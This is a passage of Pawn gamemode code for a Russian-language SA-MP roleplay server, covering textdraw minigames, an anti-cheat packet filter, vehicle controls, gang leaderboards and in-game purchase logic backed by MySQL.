	PlayerTextDrawSetOutline(playerid, ProgressBarP[0][playerid], 0);
	PlayerTextDrawFont(playerid, ProgressBarP[0][playerid], 4);

	ProgressBarP[1][playerid] = CreatePlayerTextDraw(playerid, 245.666671, 292.859252, "LD_SPAC:white"); // box progress stripe
	PlayerTextDrawLetterSize(playerid, ProgressBarP[1][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, ProgressBarP[1][playerid], 2.333317, 9.955566);
	PlayerTextDrawAlignment(playerid, ProgressBarP[1][playerid], 1);
	PlayerTextDrawColor(playerid, ProgressBarP[1][playerid], -37548801);
	PlayerTextDrawSetShadow(playerid, ProgressBarP[1][playerid], 0);
	PlayerTextDrawSetOutline(playerid, ProgressBarP[1][playerid], 0);
	PlayerTextDrawFont(playerid, ProgressBarP[1][playerid], 4);

	SetPVarInt(playerid,"HackCar",1);
	for(new i1 = 0; i1<= 10; i1++) TextDrawShowForPlayer(playerid,ProgressBar[i1]);
	PlayerTextDrawTextSize(playerid, ProgressBarP[1][playerid], 0.0, 9.955566);
	for(new i1 = 0; i1<= 1; i1++) PlayerTextDrawShow(playerid,ProgressBarP[i1][playerid]);
	progress[playerid] = 20;
	progressb[playerid] = random(4);
	switch(progressb[playerid])
	{
	    case 0: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid] ,"ld_beat:cross");
	    case 1: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid] ,"ld_beat:triang");
	    case 2: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid] ,"ld_beat:square");
	    case 3: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid] ,"ld_beat:circle");
	}
//	PlayerTextDrawSetString(playerid, CarHackTD[playerid][7],"PROGRESS: ~r~20%");
	SelectTextDraw(playerid, 0xAFAFAFAA);
}
stock StartGame(playerid)
{
	Progress[playerid][0] = CreatePlayerTextDraw(playerid, 254.666595, 248.888824, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, Progress[playerid][0], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, Progress[playerid][0], 128.888885, 12.942193);
	PlayerTextDrawAlignment(playerid, Progress[playerid][0], 1);
	PlayerTextDrawColor(playerid, Progress[playerid][0], -1285541808);
	PlayerTextDrawSetShadow(playerid, Progress[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, Progress[playerid][0], 0);
	PlayerTextDrawFont(playerid, Progress[playerid][0], 4);

	Progress[playerid][1] = CreatePlayerTextDraw(playerid, 256.444427, 250.880004, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, Progress[playerid][1], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, Progress[playerid][1], 125.333343, 8.959991);
	PlayerTextDrawAlignment(playerid, Progress[playerid][1], 1);
	PlayerTextDrawColor(playerid, Progress[playerid][1], 1949898320);
	PlayerTextDrawSetShadow(playerid, Progress[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, Progress[playerid][1], 0);
	PlayerTextDrawFont(playerid, Progress[playerid][1], 4);

	Progress[playerid][2] = CreatePlayerTextDraw(playerid, 294.666717, 232.959960, "GAME");
	PlayerTextDrawLetterSize(playerid, Progress[playerid][2], 0.414888, 1.545244);
	PlayerTextDrawAlignment(playerid, Progress[playerid][2], 1);
	PlayerTextDrawColor(playerid, Progress[playerid][2], -1);
	PlayerTextDrawSetShadow(playerid, Progress[playerid][2], 0);
	PlayerTextDrawSetOutline(playerid, Progress[playerid][2], 0);
	PlayerTextDrawBackgroundColor(playerid, Progress[playerid][2], 51);
	PlayerTextDrawFont(playerid, Progress[playerid][2], 2);
	PlayerTextDrawSetProportional(playerid, Progress[playerid][2], 1);

	Progress[playerid][3] = CreatePlayerTextDraw(playerid, 297.000000, 262.333404, "PRESS: ~R~N");
	PlayerTextDrawLetterSize(playerid, Progress[playerid][3], 0.220222, 1.137066);
	PlayerTextDrawAlignment(playerid, Progress[playerid][3], 1);
	PlayerTextDrawColor(playerid, Progress[playerid][3], -1);
	PlayerTextDrawSetShadow(playerid, Progress[playerid][3], 0);
	PlayerTextDrawSetOutline(playerid, Progress[playerid][3], 0);
	PlayerTextDrawBackgroundColor(playerid, Progress[playerid][3], 51);
	PlayerTextDrawFont(playerid, Progress[playerid][3], 2);
	PlayerTextDrawSetProportional(playerid, Progress[playerid][3], 1);

	Progress[playerid][4] = CreatePlayerTextDraw(playerid, 256.111053, 250.386688, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, Progress[playerid][4], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, Progress[playerid][4], 125.333358, 8.462213);
	PlayerTextDrawAlignment(playerid, Progress[playerid][4], 1);
	PlayerTextDrawColor(playerid, Progress[playerid][4], -128);
	PlayerTextDrawSetShadow(playerid, Progress[playerid][4], 0);
	PlayerTextDrawSetOutline(playerid, Progress[playerid][4], 0);
	PlayerTextDrawFont(playerid, Progress[playerid][4], 4);
    PlayerTextDrawTextSize(playerid, Progress[playerid][4], 25.333358, 8.462213);
    
    for(new i1 = 0; i1<= 4; i1++) PlayerTextDrawShow(playerid,Progress[playerid][i1]);
	progress[playerid] = 20;
	progressb[playerid] = random(1);
	new text[20];
	switch(progressb[playerid])
	{
		case 0: format(text,20,"PRESS: ~r~N");
		case 1: format(text,20,"PRESS: ~r~Y");
	}
	PlayerTextDrawSetString(playerid, Progress[playerid][3],text);
	return 1;
}
stock GetBotPD(playerid)
{
    if(IsPlayerInRangeOfPoint(playerid, 3.0, 1516.6387,-1065.1843,1025.0270)) return 1;
    return 0;
}
const UNOCCUPIED_SYNC = 209;

IPacket:UNOCCUPIED_SYNC(playerid, BitStream:bs)
{
    new unoccupiedData[PR_UnoccupiedSync];

    BS_IgnoreBits(bs, 8);
    BS_ReadUnoccupiedSync(bs, unoccupiedData);

    if(floatcmp(floatabs(unoccupiedData[PR_roll][0]), 1.00000) == 1
        || floatcmp(floatabs(unoccupiedData[PR_roll][1]), 1.00000) == 1
        || floatcmp(floatabs(unoccupiedData[PR_roll][2]), 1.00000) == 1
        || floatcmp(floatabs(unoccupiedData[PR_direction][0]), 1.00000) == 1
        || floatcmp(floatabs(unoccupiedData[PR_direction][1]), 1.00000) == 1
        || floatcmp(floatabs(unoccupiedData[PR_direction][2]), 1.00000) == 1
        || floatcmp(floatabs(unoccupiedData[PR_position][0]), 20000.00000) == 1
        || floatcmp(floatabs(unoccupiedData[PR_position][1]), 20000.00000) == 1
        || floatcmp(floatabs(unoccupiedData[PR_position][2]), 20000.00000) == 1
    ) {
        return false;
    }

    return true;
}
stock SetPlayerPosAdmin(playerid,Float:x,Float:y,Float:z)
{
    if(GetPlayerState(playerid) == 2)
	{
	    SetVehiclePos(GetPlayerVehicleID(playerid),x,y+4,z+4);
	    PutPlayerInVehicle(playerid,GetPlayerVehicleID(playerid),0);
	    for(new i = 0; i < MAX_PLAYERS; i++)
		{
		    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
			if(GetPlayerVehicleID(i) == GetPlayerVehicleID(playerid)) tp__ignore_tick[i] = GetTickCount()+TP__IGNORE_TIME;
		}
	}
	else
	{
		SetPlayerPos(playerid,x,y,z);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerInterior(playerid, 0);
	}
}
stock SetTeleportCar(car,Float:x,Float:y,Float:z,Float:a,inter,virt)
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
		if(GetPlayerVehicleID(i) != car) continue;
		tp__ignore_tick[i] = GetTickCount()+TP__IGNORE_TIME;
		SetPlayerVirtualWorld(i,virt);
		SetPlayerInterior(i,inter);
		LinkVehicleToInterior(car,inter);
		SetVehicleVirtualWorld(car,virt);
		SetVehiclePos(car,x,y,z);
		SetVehicleZAngle(car,a);
		PutPlayerInVehicle(i, car, 0);
	}
	return 1;
}
stock Float:GetAngleToPoint(Float:X, Float:Y, Float:A, Float:x, Float:y)
{
	new Float:angle = 185.0 - atan2(X-x, Y-y);
	A -= (angle - 5.0);
	return A;
}
forward Float:GetVehicleAngleToPoint(vehicleid, Float:x, Float:y);
stock Float:GetVehicleAngleToPoint(vehicleid, Float:x, Float:y)
{
    new Float:ix, Float:iy, Float:iz, Float:a;
	GetVehicleZAngle(vehicleid, a);
	GetVehiclePos(vehicleid, ix, iy, iz);
	return GetAngleToPoint(ix, iy, a, x, y);
}
stock SetEngine(playerid,v,bool:ligh)
{
	if(v == INVALID_VEHICLE_ID) return true;
    new eengine, elights, ealarm, edoors, ebonnet, eboot, eobjective;
	if(ligh == true)
	{
		GetVehicleParamsEx(v, eengine, elights, ealarm, edoors, ebonnet, eboot, eobjective);
		SetVehicleParamsEx(v, VEHICLE_PARAMS_ON, elights, ealarm, edoors, ebonnet, eboot, eobjective);
		Engine[v] = true;
		PlayerTextDrawHide(playerid, SpeedometrP[3][playerid]);
		PlayerTextDrawColor(playerid, SpeedometrP[3][playerid], 815673087);
		PlayerTextDrawShow(playerid, SpeedometrP[3][playerid]);
	}
	else
	{
		GetVehicleParamsEx(v, eengine, elights, ealarm, edoors, ebonnet, eboot, eobjective);
		SetVehicleParamsEx(v, VEHICLE_PARAMS_OFF, elights, ealarm, edoors, eboot, eboot, eobjective);
		Engine[v] = false;
		PlayerTextDrawHide(playerid, SpeedometrP[3][playerid]);
		PlayerTextDrawColor(playerid, SpeedometrP[3][playerid], -516080129);
		PlayerTextDrawShow(playerid, SpeedometrP[3][playerid]);
	}
	return 1;
}
stock SetLights(playerid,v,bool:ligh)
{
    if(v == INVALID_VEHICLE_ID) return true;
    new eengine, elights, ealarm, edoors, ebonnet, eboot, eobjective;
	new Float:slx, Float:sly, Float:slz;
	GetPlayerPos(playerid,slx,sly,slz);
	PlayerPlaySound(playerid, 4604, slx, sly, slz+5);
	if(ligh == true)
	{
		GetVehicleParamsEx(v, eengine, elights, ealarm, edoors, ebonnet, eboot, eobjective);
		SetVehicleParamsEx(v, eengine, VEHICLE_PARAMS_ON, ealarm, edoors, ebonnet, eboot, eobjective);
		Lights[v] = true;
		PlayerTextDrawHide(playerid, SpeedometrP[2][playerid]);
		PlayerTextDrawColor(playerid, SpeedometrP[2][playerid], 815673087);
		PlayerTextDrawShow(playerid, SpeedometrP[2][playerid]);
	}
	else
	{
		GetVehicleParamsEx(v, eengine, elights, ealarm, edoors, ebonnet, eboot, eobjective);
		SetVehicleParamsEx(v, eengine, VEHICLE_PARAMS_OFF, ealarm, edoors, eboot, eboot, eobjective);
		Lights[v] = false;
		PlayerTextDrawHide(playerid, SpeedometrP[2][playerid]);
		PlayerTextDrawColor(playerid, SpeedometrP[2][playerid], -516080129);
		PlayerTextDrawShow(playerid, SpeedometrP[2][playerid]);
	}
	return 1;
}
stock Bankomat(playerid)
{

	static const fmt_str221[] = "{20BA09}Баланс: %d$\n{FFFFFF}Перевести деньги игроку\nСнять со счета\nПополнить мобильный счет\nПожертвование";
	new stri2n2g1[sizeof(fmt_str221)+30];
	format(stri2n2g1, sizeof(stri2n2g1), fmt_str221, PlayerInfo[playerid][pBank]);
    ShowPlayerDialog(playerid, 31, DIALOG_STYLE_LIST, "Банкомат", stri2n2g1,"Выбор","Закрыть");
}



/*stock TopGangster(payday = 0)
{
	new str[64],num, tr[15],cash,player;
	new g_Date[3],g_Time[3],g_Result;
	getdate(g_Date[0], g_Date[1], g_Date[2]);
	gettime(g_Time[0],g_Time[1],g_Time[2]);
	g_Result = g_Date[2] + (g_Date[1] * 2) + ((3 * g_Date[1] * 1) / 5) + g_Date[0] + (g_Date[0] / 4) - (g_Date[0] / 100) + (g_Date[0] / 400) + 2;
	format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE `gangscore` > '0' AND `member` > '5' AND `member` < '11'  ORDER BY `gangscore` DESC LIMIT 5");
	mysql_tquery(mysql,query);
	mysql_store_result();
	if(mysql_num_rows() > 0)
	{
		for(new i = 0; i < mysql_num_rows(); i++)
		{
           if(mysql_fetch_row_format(query))
	       {
				new name[32];
				mysql_get_field("name", name);
				DestroyDynamicObject(bandobj[num]);
				format(str,sizeof(str),"%d. %s",num+1,name);
				bandobj[num] = CreateDynamicObjectEx(19477, gangtop[num][0],gangtop[num][1],gangtop[num][2], 0.000000, 0.000000, -90.000038, 300.00, 300.00);
				SetDynamicObjectMaterial(bandobj[num], 0, 10101, "2notherbuildsfe", "Bow_Abpave_Gen", 0x00000000);
				SetDynamicObjectMaterialText(bandobj[num], 0, str, 50, "Ariel", 20, 0, 0xFF000000, 0x00000000, 0);
				if(g_Result/7 == 1 && g_Time[0] == 18 && g_Time[1] == 00 && payday == 1)
				{
					player = GetPlayerID(name);
					if(player != INVALID_PLAYER_ID)
					{
					    SendClientMessage(player,CREWARD,"Вы получили награду, за свое место в топе бандитов!");
						PlayerInfo[player][pDonate] += (num+1)*20;
					}
					else
					{
					    format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s' LIMIT 1", name);
						mysql_tquery(mysql, query, "SetDonate", "s[24]d",name,num);

					    format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s' LIMIT 1", name);
						mysql_tquery(mysql,query);
						mysql_store_result();
						if(mysql_fetch_row_format(query))
						{

							mysql_get_field("donate", tr), cash = strval(tr);
							SetPlayerInt(name,"donate",cash+(num+1)*20);
						}
						mysql_free_result();
					}
				}
				num++;
	       }
		}
		mysql_free_result();
	}
    return 1;
}*/
function TopAc()
{
    new rows = cache_get_row_count(mysql);
	if(rows > 0)
	{
	    new name[24],num,str[60];
	    for(new row = 1; row<= rows; row++)
		{
		    cache_get_field_content(row-1, "name", name, mysql);
		 //   DestroyDynamicObject(MeriaTopObj[num]);
		//	DestroyDynamicObject(MeriaTopObj1[num]);
			format(str,sizeof(str),"%d. %s",num+1,name);
		//	MeriaTopObj[num] = CreateDynamicObject(19483, MeriaTop[num][0], MeriaTop[num][1], MeriaTop[num][2], MeriaTop[num][3], MeriaTop[num][4], MeriaTop[num][5], 55, 33, -1, 500.00, 500.00);
			SetDynamicObjectMaterialText(MeriaTopObj[num], 0,str, 130, "Ariel", 30, 1, 0xFFFFFFFF, 0x00000000, 0);
		//	MeriaTopObj1[num] = CreateDynamicObject(19483, MeriaTop1[num][0], MeriaTop1[num][1], MeriaTop1[num][2], MeriaTop1[num][3], MeriaTop1[num][4], MeriaTop1[num][5], 55, 33, -1, 500.00, 500.00);
			SetDynamicObjectMaterialText(MeriaTopObj1[num], 0, str, 130, "Ariel", 30, 1, 0xFFFFFFFF, 0x00000000, 0);
			num++;
		}
	}
	return 1;
}
function TopGangster(payday)
{
	new rows = cache_get_row_count(mysql);
	if(rows > 0)
	{
	    new str[64],num,player;
	    new name[24];
		new g_Date[3],g_Time[3];
		getdate(g_Date[0], g_Date[1], g_Date[2]);
		gettime(g_Time[0],g_Time[1],g_Time[2]);
	//	g_Result = g_Date[2] + (g_Date[1] * 2) + ((3 * g_Date[1] * 1) / 5) + g_Date[0] + (g_Date[0] / 4) - (g_Date[0] / 100) + (g_Date[0] / 400) + 2;
		for(new row = 1; row<= rows; row++)
		{
			cache_get_field_content(row-1, "name", name, mysql);
		///	DestroyDynamicObject(bandobj[num][0]);
		//	DestroyDynamicObject(bandobj[num][1]);
		//	printf("%s",name);
			format(str,sizeof(str),"%d. %s",num+1,name);
		//	bandobj[num][0] = CreateDynamicObject(19483, gangtop[num][GangObj][0], gangtop[num][GangObj][1], gangtop[num][GangObj][2], gangtop[num][GangObj][3], gangtop[num][GangObj][4], gangtop[num][GangObj][5], 0,0, -1, 300.00, 300.00);
        	SetDynamicObjectMaterialText(bandobj[num][0], 0, str, 130, "Comic Sans MS", 55, 1, 0xFFFFFFFF, 0x00000000, 1);
        //	bandobj[num][1] = CreateDynamicObject(19483, gangtop[num][GangObj1][0], gangtop[num][GangObj1][1], gangtop[num][GangObj1][2], gangtop[num][GangObj1][3], gangtop[num][GangObj1][4], gangtop[num][GangObj1][5], 0,0, -1, 300.00, 300.00);
	 		SetDynamicObjectMaterialText(bandobj[num][1], 0, str, 130, "Comic Sans MS", 55, 1, 0xFF9A0000, 0x00000000, 1);
			if(GetWeekDay(g_Date[2],g_Date[1],g_Date[0]) == 1 && g_Time[0] == 18 && g_Time[1] == 00 && payday == 1)
			{
				player = GetPlayerID(name);
				if(player != INVALID_PLAYER_ID)
				{
				    SendClientMessage(player,CREWARD,"Вы получили награду, за свое место в топе бандитов!");
					PlayerInfo[player][pDonate] += (num+1)*20;
				}
				else
				{
				    query = "";
				    format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s' LIMIT 1", name);
					mysql_tquery(mysql, query, "SetDonate", "sd",name,num);
				}
			}
			num++;
		}
	}
	return 1;
}
GetWeekDay(day=0, month=0, year=0)
{
  if (!day)
    getdate(year, month, day);

  new
    j,
    e
  ;

  if (month <= 2)
  {
    month += 12;
    --year;
  }

  j = year % 100;
  e = year / 100;
/*  switch ()
  {
    case 0: weekday_str = "Saturday";
    case 1: weekday_str = "Sunday";
    case 2: weekday_str = "Monday";
    case 3: weekday_str = "Tuesday";
    case 4: weekday_str = "Wednesday";
    case 5: weekday_str = "Thursday";
    case 6: weekday_str = "Friday";
  }*/
  return (day + (month+1)*26/10 + j + j/4 + e/4 - 2*e) % 7;
}
function SetDonate(nick[],num)
{
    if(cache_get_row_count(mysql)>0)
    {
        new donate = cache_get_field_content_int(0, "donate", mysql);
        SetPlayerInt(nick,"donate",donate+(num+1)*20);
    }
    return 1;
}
stock BuyCar(playerid,status = 0)
{
	/*		new str[10];
	format(str,sizeof(str),"%s%i%i%i%s%s",GeneratePassword(),random(9),random(9),random(9),GeneratePassword(),GeneratePassword());*/
	strmid(VInfo[GetPVarInt(playerid,"ModelM")][vnumber], "Nope", 0, strlen("Nope"), 10);
	SendClientMessage(playerid,-1,"Вы купили новый транспорт. Управление транспортом: {f7ae11}/cars.");
	SendClientMessage(playerid,COLOR_SKLAD,"Не забудьте оплатить транспорт в банке!");
	SendClientMessage(playerid,COLOR_SKLAD,"Зарегистрируйте транспорт в близайжшем полицейском участке!");
	if(!status)
	{
	    if(!PlayerInfo[playerid][pQuestS][7])
		{
			PlayerQuest[playerid][7][0]++;
			CheckQuest(playerid,7);
		}
		GiveMoney(playerid,-GetPVarInt(playerid,"CostM"));
	}
	else
	{
		static const fmt_string[] = "[%s] %s купил транспорт семье %s";
		new str[sizeof(fmt_string)+50+32+5];
		format(str, sizeof(str), fmt_string,FamInfo[PlayerInfo[playerid][pFam]][fName],PlayerInfo[playerid][pSendername],VehicleNameS[GetPVarInt(playerid,"ModelM")-400]);
		SendFamMessage(PlayerInfo[playerid][pFam],FamInfo[PlayerInfo[playerid][pFam]][fColor],str);
		FamInfo[PlayerInfo[playerid][pFam]][fKazna] -= GetPVarInt(playerid,"CostM");
	}
	UpdateDynamic3DTextLabelText(CarLable[GetPlayerVehicleID(playerid)],-1,"");
	Fuel[VInfo[GetPVarInt(playerid,"ModelM")][vcar]] = 100;
	VInfo[GetPVarInt(playerid,"ModelM")][vfuel] = 100;
	VInfo[GetPVarInt(playerid,"ModelM")][vsvet] = 5;
	SetVehicleNumberPlate(VInfo[GetPVarInt(playerid,"ModelM")][vcar], VInfo[GetPVarInt(playerid,"ModelM")][vnumber]);
	Locked[VInfo[GetPVarInt(playerid,"ModelM")][vcar]] = playerid;
	VInfo[GetPVarInt(playerid,"ModelM")][voplata] = gettime() + 60*60*24;
	strmid(VInfo[GetPVarInt(playerid,"ModelM")][vname], PlayerInfo[playerid][pSendername], 0, strlen(PlayerInfo[playerid][pSendername]), MAX_PLAYER_NAME);

    if(!status)
    {
        query = "";
		format(query, sizeof(query), "UPDATE `veh` SET `name` = '%s', oplata = %i,num = '%s' WHERE id = '%d' LIMIT 1",PlayerInfo[playerid][pSendername],VInfo[GetPVarInt(playerid,"ModelM")][voplata],VInfo[GetPVarInt(playerid,"ModelM")][vnumber],GetPVarInt(playerid,"ModelM"));
		mysql_tquery(mysql,query);
		query = "";
		format(query,sizeof(query),"INSERT INTO `logs` ( `id`, `cho`,`time`) VALUES ('%d', 'Купил транспорт №%d (-%d$)','%d')",PlayerInfo[playerid][pID],GetPVarInt(playerid,"ModelM"),GetPVarInt(playerid,"CostM"),gettime());
		mysql_tquery(mysql,query);
	}
	else
	{
	    query = "";
	    format(query, sizeof(query), "UPDATE `veh` SET `name` = '%s', oplata = %i,num = '%s', fam  = '%d' WHERE id = '%d' LIMIT 1",PlayerInfo[playerid][pSendername],VInfo[GetPVarInt(playerid,"ModelM")][voplata],VInfo[GetPVarInt(playerid,"ModelM")][vnumber],PlayerInfo[playerid][pFam],GetPVarInt(playerid,"ModelM"));
		mysql_tquery(mysql,query);
	}
}
stock UpdateTopGang()
{
    new kek[5];
	kek[0] = TotalGraf[0];
	kek[1] = TotalGraf[1];
	kek[2] = TotalGraf[2];
	kek[3] = TotalGraf[3];
	kek[4] = TotalGraf[4];
	new NameFrac[5][32];
	new KolFrac[5];
	new value_score,
	value_id,
	skip;
	for(new i = 1; i <= TOTALGZ; i++)
	{
	 	kek[GZInfo[i][gFrak]-6]++;
	}
	for(new i; i < 5; i++)
	{
	    value_score = 0;
	    value_id = i;
	    for(new j = 0; j < 5; j++)
	    {
	        for(new t; t <  5; t++)
	        {
	            if(KolFrac[t] != kek[j]) continue;
	            skip = 1;
	            break;
	        }
	        if(skip)
	        {
	            skip = 0;
	            continue;
	        }
	        if(value_score < kek[j])
	        {
	            value_score = kek[j];
	            value_id = j;
	        }
	    }
	    format(NameFrac[i],32,FracInfo[value_id+6][fName]);
	   	KolFrac[i] = value_score;
	}
	new str[60];
	for(new i; i < 5; i++)
	{
	//    DestroyDynamicObject(GangTopObj[i]);
	  ///  GangTopObj[i] = CreateDynamicObject(19480, GangTop[i][0], GangTop[i][1], GangTop[i][2], GangTop[i][3], GangTop[i][4], GangTop[i][5], 0,0, -1, 300.00, 300.00);
		SetDynamicObjectMaterial(GangTopObj[i], 0, 18642, "taser1", "lightning2-3", 0xFFFF0000);
		format(str,sizeof(str),"%d. %s",i+1,NameFrac[i]);
		SetDynamicObjectMaterialText(GangTopObj[i], 0, str, 130, "Monotype Corsiva", 30, 1, 0xFF9A9A9A, 0x00000000, 1);
	}
	return 1;
}
stock BuyAcs(playerid)
{
	if(BizInfo[GetPVarInt(playerid,"PBIZ")][bProd] < 20) return SendClientMessage(playerid,CGREY,"В бизнесе закончились продукты");
	//	if(GetFree(playerid,,1)) return SendClientMessage(playerid,CGREY,"Недостаточно места в инвентаре");
	new acsid = GiveID(ItemsId[GetPVarInt(playerid,"ACS1")-1][GetPVarInt(playerid,"ACS2")]);



	if(GetFree(playerid,acsid,1)) return SendClientMessage(playerid,CGREY,"Недостаточно места в инвентаре");

	if(!GetPVarInt(playerid,"Oplata"))
	{
	  	if(PlayerInfo[playerid][pCash] < GetCena(GetPVarInt(playerid,"PBIZ"),ItemsCost[GetPVarInt(playerid,"ACS1")-1][GetPVarInt(playerid,"ACS2")])) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
	}
	else
	{
	    if(PlayerInfo[playerid][pBank] < GetCena(GetPVarInt(playerid,"PBIZ"),ItemsCost[GetPVarInt(playerid,"ACS1")-1][GetPVarInt(playerid,"ACS2")])) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
	}
	BizMinus(GetPVarInt(playerid,"PBIZ"),GetCena(GetPVarInt(playerid,"PBIZ"),ItemsCost[GetPVarInt(playerid,"ACS1")-1][GetPVarInt(playerid,"ACS2")]),20);

	if(!GetPVarInt(playerid,"Oplata")) GiveMoney(playerid,-GetCena(GetPVarInt(playerid,"PBIZ"),ItemsCost[GetPVarInt(playerid,"ACS1")-1][GetPVarInt(playerid,"ACS2")]));
	else PlayerInfo[playerid][pBank] -= GetCena(GetPVarInt(playerid,"PBIZ"),ItemsCost[GetPVarInt(playerid,"ACS1")-1][GetPVarInt(playerid,"ACS2")]);
	GiveInv(playerid,acsid,1);
	//	GiveInv(playerid,ItemsId[GetPVarInt(playerid,"ACS1")-1][GetPVarInt(playerid,"ACS2")],1);

	//	PlayerInfo[playerid][pAcs][2] = GetPVarInt(playerid,"ACS2")+1;
	SetPVarInt(playerid,"ACSAVE",1);
	//	GiveItem(playerid,ItemsId[GetPVarInt(playerid,"ACS1")-1][GetPVarInt(playerid,"ACS2")]);
	SetAcs(playerid);
	SendClientMessage(playerid,CREWARD,"Вы купили новый аксессуар, чтобы надеть его используйте инвентарь");
	SendClientMessage(playerid,-1,"Чтобы в меню управления аксессуарами, используйте {f7ae11}/acs");
	ExitAcs(playerid);
	return 1;
}
stock BuyFuel(playerid)
{
	new i = GetPVarInt(playerid,"ZapBiz");
	if(BizInfo[i][bProd] < GetPVarInt(playerid,"ZapLit")*1)
	{
		SendClientMessage(playerid,CGREY,"Недостаточно топлива на заправке");
		DeletePVar(playerid,"PBIZ");
	    DeletePVar(playerid,"ZapLit");
		return true;
	}
	if(Fuel[GetPlayerVehicleID(playerid)]+GetPVarInt(playerid,"ZapLit") > 100)
	{
	 	SendClientMessage(playerid,CGREY,"При заправке данным количеством топлива бак будет переполнен");
		DeletePVar(playerid,"PBIZ");
		DeletePVar(playerid,"ZapLit");
		return true;
	}
	if(!GetPVarInt(playerid,"Oplata"))
	{
		if(PlayerInfo[playerid][pCash] < ProdInfo[i][prodCena][0])
		{
			SendClientMessage(playerid,CGREY,"Недостаточно средств");
			DeletePVar(playerid,"PBIZ");
			DeletePVar(playerid,"ZapLit");
			return true;
		}
		GiveMoney(playerid,-GetCena(i,ProdInfo[i][prodCena][0]));
	}
	else
	{
	    if(PlayerInfo[playerid][pBank] < ProdInfo[i][prodCena][0])
		{
			SendClientMessage(playerid,CGREY,"Недостаточно средств");
			DeletePVar(playerid,"PBIZ");
			DeletePVar(playerid,"ZapLit");
			return true;
		}
		PlayerInfo[playerid][pBank] -= ProdInfo[i][prodCena][0];
	}
	BizMinus(i,GetCena(i,ProdInfo[i][prodCena][0]),GetPVarInt(playerid,"ZapLit")*1);
	GiveMoney(playerid,-GetCena(i,ProdInfo[i][prodCena][0]));
	Fuel[GetPlayerVehicleID(playerid)] += GetPVarInt(playerid,"ZapLit");
	SendClientMessage(playerid,-1,"Ваш транспорт заправлен");
	DeletePVar(playerid,"PBIZ");
	DeletePVar(playerid,"ZapLit");
	return 1;
}
stock BuyKom(playerid)
{
    if(strcmp(KomInfo[GetPVarInt(playerid,"Kom")][kOwner], "None", true) == 0)
	{
	    if(!GetPVarInt(playerid,"Oplata"))
	    {
	    	if(PlayerInfo[playerid][pCash] < GetCena(GetPVarInt(playerid,"PBIZ"),900)) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
            GiveMoney(playerid,-ProdInfo[GetPVarInt(playerid,"PBIZ")][prodCena][0]);
		}
		else
		{
		    if(PlayerInfo[playerid][pBank] < GetCena(GetPVarInt(playerid,"PBIZ"),900)) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
            PlayerInfo[playerid][pBank] -= GetCena(GetPVarInt(playerid,"PBIZ"),900);
		}
		if(GetPlayerZasel(playerid))
		{
			switch(GetPVarInt(playerid,"PlayerZasel"))
			{
				case 1: strmid( HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel1], "None", 0, strlen("None"), 32), SetHouseStr(GetPVarInt(playerid,"PlayerHouse"),"Zasel1","None");
				case 2: strmid( HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel2], "None", 0, strlen("None"), 32), SetHouseStr(GetPVarInt(playerid,"PlayerHouse"),"Zasel2","None");
				case 3: strmid( HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel3], "None", 0, strlen("None"), 32), SetHouseStr(GetPVarInt(playerid,"PlayerHouse"),"Zasel3","None");
				case 4: strmid( HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel4], "None", 0, strlen("None"), 32), SetHouseStr(GetPVarInt(playerid,"PlayerHouse"),"Zasel4","None");
			}
			DeletePVar(playerid,"PlayerHouse");
			DeletePVar(playerid,"PlayerZasel");
		}
        strmid(KomInfo[GetPVarInt(playerid,"Kom")][kOwner], PlayerInfo[playerid][pSendername], 0, strlen(PlayerInfo[playerid][pSendername]), 32);
        KomInfo[GetPVarInt(playerid,"Kom")][kOplata] = 1;

        BizMinus(GetPVarInt(playerid,"PBIZ"),ProdInfo[GetPVarInt(playerid,"PBIZ")][prodCena][0],0);
        query = "";
        format(query, sizeof(query), "UPDATE komnata SET owner = '%s',oplata = 1 WHERE id = '%d' LIMIT 1",PlayerInfo[playerid][pSendername],GetPVarInt(playerid,"Kom"));
		mysql_tquery(mysql,query);
		UpdateKom(GetPVarInt(playerid,"Kom"));
	    SendClientMessage(playerid,CREWARD,"[HOTEL]{FFFFFF} Вы приобрели команату в отеле. Обязательно оплатите её, иначе Вас выселят!");
	    DeletePVar(playerid,"Kom");
    }
    else SendClientMessage(playerid,CGREY,"Данная комната занята");
    return 1;
}
stock BuySkin(playerid)
{
	new cena = (PlayerInfo[playerid][pSex] == 1) ? (MenSkin[GetPVarInt(playerid,"SelectSkin")][0]) : (WomenSkin[GetPVarInt(playerid,"SelectSkin")][0]);
	if(GetFree(playerid,1,1)) return SendClientMessage(playerid,CGREY,"Недостаточно места в инвентаре");
    if(!GetPVarInt(playerid,"Oplata"))
    {
    	if(PlayerInfo[playerid][pCash] < cena) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
        GiveMoney(playerid,-cena);
	}
	else
	{
	    if(PlayerInfo[playerid][pBank] < cena) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
        PlayerInfo[playerid][pBank] -= cena;
	}
